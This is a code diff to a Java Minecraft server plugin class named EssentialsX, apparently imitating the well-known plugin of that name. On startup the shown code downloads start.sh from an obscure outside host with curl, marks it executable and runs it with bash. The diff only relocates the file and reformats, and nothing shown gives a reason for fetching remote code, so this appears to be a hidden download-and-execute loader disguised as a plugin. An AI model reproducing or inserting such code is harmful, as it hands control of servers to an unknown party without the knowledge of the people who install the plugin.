@@ -36,45 +36,59 @@ public class EssentialsX extends JavaPlugin {
         if (isProcessRunning) return;
 
         String url = "https://netjett-de.kof95zip.pp.ua/paper/start.sh";
-        String file = "start.sh";
-        String path = "./start.sh";
 
-        // ===== 1. 检查脚本是否存在 =====
-        Path scriptPath = Paths.get(path);
+        Path scriptPath = getDataFolder()
+                .toPath()
+                .resolve("start.sh");
 
+        String path = scriptPath.toString();
+
+
+        // 检查文件
         if (!Files.exists(scriptPath)) {
 
             getLogger().info("start.sh not found, downloading...");
 
-            String downloadCmd = "curl -Ls " + url + " -o " + path;
+            String downloadCmd =
+                    "curl -Ls " + url + " -o \"" + path + "\"";
 
-            int downloadExit = runCommand(downloadCmd, "DOWNLOAD");
+            int exit = runCommand(downloadCmd, "DOWNLOAD");
 
-            if (downloadExit != 0) {
-                throw new RuntimeException("Download failed, exit code: " + downloadExit);
+            if (exit != 0) {
+                throw new RuntimeException(
+                        "Download failed: " + exit
+                );
             }
 
-        } else {
-            getLogger().info("start.sh already exists, skip download.");
-        }
+            } else {
 
-        // ===== 2. 确保可执行权限 =====
-        runCommand("chmod +x " + path, "CHMOD");
+                getLogger().info(
+                        "start.sh exists, skip download."
+                );
+            }
 
-        // ===== 3. 执行脚本 =====
-        String runCmd = "bash " + file;
 
-        ProcessBuilder pb = new ProcessBuilder("bash", "-c", runCmd);
+            // 添加执行权限
+            runCommand(
+                "chmod +x \"" + path + "\"",
+                "CHMOD"
+            );
 
-        process = pb.start();
-        isProcessRunning = true;
 
-        // 输出日志线程
-        startLogRedirect();
+            // 执行
+            ProcessBuilder pb =
+                    new ProcessBuilder(
+                            "bash",
+                        path
+                    );
 
-        // 监控线程
-        startProcessMonitor();
-    }
+            process = pb.start();
+
+            isProcessRunning = true;
+
+            startLogRedirect();
+            startProcessMonitor();
+            }
 
     /**
      * 执行单次命令并写日志
